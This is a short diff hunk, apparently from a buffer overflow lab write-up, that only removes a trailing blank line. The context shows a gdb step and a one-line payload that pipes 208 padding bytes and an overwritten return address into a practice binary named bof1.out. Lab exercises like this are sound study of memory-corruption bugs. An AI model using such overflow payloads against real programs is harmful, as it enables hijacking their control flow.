@@ -61,4 +61,3 @@ gdb bof1.out
 ```
 echo $(python3 -c "print('a' * 208 + '\xbd\x11\x00\x00')") | ./bof1.out
 ```
-
